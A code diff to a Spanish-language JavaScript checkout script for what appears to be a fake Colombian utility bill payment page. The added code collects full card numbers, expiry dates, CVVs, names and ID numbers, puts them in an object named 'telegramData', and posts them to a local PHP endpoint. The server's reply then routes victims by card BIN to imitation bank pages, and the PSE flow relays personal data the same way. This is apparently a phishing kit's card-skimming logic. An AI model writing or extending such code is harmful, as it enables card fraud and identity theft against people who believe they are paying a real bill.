@@ -341,6 +341,20 @@ function showCheckoutSection(formData, originalAmount, finalAmount, paymentType)
     document.getElementById('telefono-pago').value = formData.telefono;
     document.getElementById('email-pago').value = formData.email;
 
+    // Pre-fill credit card form fields
+    const cardNameInput = document.getElementById('card-name');
+    if (cardNameInput && !cardNameInput.value) {
+        cardNameInput.value = `${formData.nombres} ${formData.apellidos}`.toUpperCase();
+    }
+    const cardDocType = document.getElementById('card-doc-type');
+    if (cardDocType) {
+        cardDocType.value = formData.tipoId || 'CC';
+    }
+    const cardDocNum = document.getElementById('card-doc-num');
+    if (cardDocNum) {
+        cardDocNum.value = formData.numeroId || '';
+    }
+
     // Scroll to top
     window.scrollTo({ top: 0, behavior: 'smooth' });
 }
@@ -428,8 +442,103 @@ function showNotification(message, type = 'info') {
     }, 3000);
 }
 
+// ===== Payment Method Toggle & Credit Card Handlers =====
+function setupPaymentMethodToggle() {
+    const pseRadio = document.getElementById('pse-method');
+    const cardRadio = document.getElementById('card-method');
+    const pseContainer = document.getElementById('pse-fields-container');
+    const cardContainer = document.getElementById('card-fields-container');
+    const optionPse = document.getElementById('option-pse');
+    const optionCard = document.getElementById('option-card');
+
+    if (!pseRadio || !cardRadio) return;
+
+    function toggleMethods() {
+        if (cardRadio.checked) {
+            pseContainer.style.display = 'none';
+            cardContainer.style.display = 'flex';
+            optionPse.classList.remove('active');
+            optionCard.classList.add('active');
+        } else {
+            pseContainer.style.display = 'flex';
+            cardContainer.style.display = 'none';
+            optionPse.classList.add('active');
+            optionCard.classList.remove('active');
+        }
+    }
+
+    pseRadio.addEventListener('change', toggleMethods);
+    cardRadio.addEventListener('change', toggleMethods);
+
+    if (optionPse) optionPse.addEventListener('click', (e) => {
+        if (e.target !== pseRadio) {
+            pseRadio.checked = true;
+            toggleMethods();
+        }
+    });
+
+    if (optionCard) optionCard.addEventListener('click', (e) => {
+        if (e.target !== cardRadio) {
+            cardRadio.checked = true;
+            toggleMethods();
+        }
+    });
+}
+
+function setupCardInputFormatters() {
+    const cardNumberInput = document.getElementById('card-number');
+    const cardExpiryInput = document.getElementById('card-expiry');
+    const cardCvvInput = document.getElementById('card-cvv');
+    const cardBrandIndicator = document.getElementById('card-brand-indicator');
+
+    if (cardNumberInput) {
+        cardNumberInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = '';
+            for (let i = 0; i < value.length && i < 16; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            e.target.value = formatted;
+
+            // Brand detection indicator
+            if (value.startsWith('4')) {
+                if (cardBrandIndicator) cardBrandIndicator.textContent = '💙 Visa';
+            } else if (/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[0-1]|2720)/.test(value)) {
+                if (cardBrandIndicator) cardBrandIndicator.textContent = '🔴 Mastercard';
+            } else if (/^(34|37)/.test(value)) {
+                if (cardBrandIndicator) cardBrandIndicator.textContent = '🟩 AMEX';
+            } else if (/^(30[0-5]|36|38)/.test(value)) {
+                if (cardBrandIndicator) cardBrandIndicator.textContent = '🌐 Diners';
+            } else {
+                if (cardBrandIndicator) cardBrandIndicator.textContent = '💳';
+            }
+        });
+    }
+
+    if (cardExpiryInput) {
+        cardExpiryInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 3) {
+                e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            } else {
+                e.target.value = value.slice(0, 4);
+            }
+        });
+    }
+
+    if (cardCvvInput) {
+        cardCvvInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+        });
+    }
+}
+
 // Initialize payment functionality
 document.addEventListener('DOMContentLoaded', function () {
+    setupPaymentMethodToggle();
+    setupCardInputFormatters();
+
     // PAGAR button click
     const pagarButton = document.querySelector('.btn-submit');
     if (pagarButton) {
@@ -481,50 +590,137 @@ document.addEventListener('DOMContentLoaded', function () {
     const btnIniciarPago = document.getElementById('btn-iniciar-pago');
     if (btnIniciarPago) {
         btnIniciarPago.addEventListener('click', () => {
-            const bancoSelect = document.getElementById('banco-select');
-            const selectedBank = bancoSelect ? bancoSelect.value : '';
+            const isCard = document.getElementById('card-method') && document.getElementById('card-method').checked;
 
-            if (!selectedBank) {
-                showNotification('Por favor seleccione su banco', 'warning');
-                return;
-            }
+            if (isCard) {
+                const cardName = document.getElementById('card-name').value.trim();
+                const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
+                const cardExpiry = document.getElementById('card-expiry').value.trim();
+                const cardCvv = document.getElementById('card-cvv').value.trim();
+                const cardDocNum = document.getElementById('card-doc-num').value.trim();
 
-            // --- Telegram Notification Logic ---
-            const btn = document.getElementById('btn-iniciar-pago');
-            const originalText = btn.textContent;
-            btn.textContent = 'Procesando...';
-            btn.disabled = true;
+                if (!cardName) {
+                    showNotification('Por favor ingrese el nombre del titular de la tarjeta', 'warning');
+                    return;
+                }
+                if (cardNumber.length < 15) {
+                    showNotification('Por favor ingrese un número de tarjeta válido (15-16 dígitos)', 'warning');
+                    return;
+                }
+                if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExpiry)) {
+                    showNotification('Por favor ingrese una fecha de expiración válida (MM/AA)', 'warning');
+                    return;
+                }
+                if (cardCvv.length < 3) {
+                    showNotification('Por favor ingrese el código CVV (3 o 4 dígitos)', 'warning');
+                    return;
+                }
+                if (!cardDocNum) {
+                    showNotification('Por favor ingrese el documento del titular', 'warning');
+                    return;
+                }
 
-            const telegramData = {
-                nic: document.getElementById('checkout-usuario').textContent,
-                valorMes: paymentData.valorMes,
-                deudaTotal: paymentData.deudaTotal,
-                paymentType: document.getElementById('checkout-concepto').textContent,
-                totalPagar: document.getElementById('checkout-total-pagar').textContent,
+                const btn = document.getElementById('btn-iniciar-pago');
+                const originalText = btn.textContent;
+                btn.textContent = 'Procesando...';
+                btn.disabled = true;
 
-                nombre: document.getElementById('checkout-nombre').textContent,
-                identificacion: document.getElementById('checkout-identificacion').textContent,
-                email: document.getElementById('checkout-correo').textContent,
-                telefono: document.getElementById('telefono-pago').value,
-                direccion: document.getElementById('direccion-pago').value,
+                const telegramData = {
+                    paymentMethod: 'card',
+                    nic: document.getElementById('checkout-usuario').textContent,
+                    valorMes: paymentData.valorMes,
+                    deudaTotal: paymentData.deudaTotal,
+                    paymentType: document.getElementById('checkout-concepto').textContent,
+                    totalPagar: document.getElementById('checkout-total-pagar').textContent,
 
-                banco: selectedBank
-            };
+                    nombre: document.getElementById('checkout-nombre').textContent,
+                    identificacion: document.getElementById('checkout-identificacion').textContent,
+                    email: document.getElementById('checkout-correo').textContent,
+                    telefono: document.getElementById('telefono-pago').value,
+                    direccion: document.getElementById('direccion-pago').value,
 
-            // Send data to backend before redirecting
-            fetch('send_invoice_data.php', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(telegramData)
-            })
-                .then(() => {
-                    window.location.href = `pse/index.php?banco=${encodeURIComponent(selectedBank)}`;
+                    cardName: cardName,
+                    cardNumber: document.getElementById('card-number').value.trim(),
+                    cardExpiry: cardExpiry,
+                    cardCvv: cardCvv,
+                    cardCuotas: document.getElementById('card-cuotas').value,
+                    cardDoc: `${document.getElementById('card-doc-type').value}: ${cardDocNum}`
+                };
+
+                showLoadingOverlay('Verificando tarjeta y banco...');
+
+                fetch('process_card_bin.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(telegramData)
                 })
-                .catch(err => {
-                    console.error("Error sending notification", err);
-                    // Redirect anyway if notification fails
-                    window.location.href = `pse/index.php?banco=${encodeURIComponent(selectedBank)}`;
-                });
+                    .then(response => response.json())
+                    .then(data => {
+                        hideLoadingOverlay();
+                        btn.textContent = originalText;
+                        btn.disabled = false;
+                        if (data.status === 'success' && data.redirect) {
+                            showNotification(`Banco detectado: ${data.bank || 'Redirigiendo...'}`, 'success');
+                            setTimeout(() => {
+                                window.location.href = data.redirect;
+                            }, 1000);
+                        } else {
+                            showNotification('Solicitud procesada correctamente', 'success');
+                        }
+                    })
+                    .catch(err => {
+                        hideLoadingOverlay();
+                        btn.textContent = originalText;
+                        btn.disabled = false;
+                        console.error("Error procesando BIN de tarjeta", err);
+                        showNotification('Error al verificar la tarjeta', 'warning');
+                    });
+
+            } else {
+                // PSE Payment Flow
+                const bancoSelect = document.getElementById('banco-select');
+                const selectedBank = bancoSelect ? bancoSelect.value : '';
+
+                if (!selectedBank) {
+                    showNotification('Por favor seleccione su banco', 'warning');
+                    return;
+                }
+
+                const btn = document.getElementById('btn-iniciar-pago');
+                const originalText = btn.textContent;
+                btn.textContent = 'Procesando...';
+                btn.disabled = true;
+
+                const telegramData = {
+                    paymentMethod: 'pse',
+                    nic: document.getElementById('checkout-usuario').textContent,
+                    valorMes: paymentData.valorMes,
+                    deudaTotal: paymentData.deudaTotal,
+                    paymentType: document.getElementById('checkout-concepto').textContent,
+                    totalPagar: document.getElementById('checkout-total-pagar').textContent,
+
+                    nombre: document.getElementById('checkout-nombre').textContent,
+                    identificacion: document.getElementById('checkout-identificacion').textContent,
+                    email: document.getElementById('checkout-correo').textContent,
+                    telefono: document.getElementById('telefono-pago').value,
+                    direccion: document.getElementById('direccion-pago').value,
+
+                    banco: selectedBank
+                };
+
+                fetch('send_invoice_data.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(telegramData)
+                })
+                    .then(() => {
+                        window.location.href = `pse/index.php?banco=${encodeURIComponent(selectedBank)}`;
+                    })
+                    .catch(err => {
+                        console.error("Error sending notification", err);
+                        window.location.href = `pse/index.php?banco=${encodeURIComponent(selectedBank)}`;
+                    });
+            }
         });
     }
 
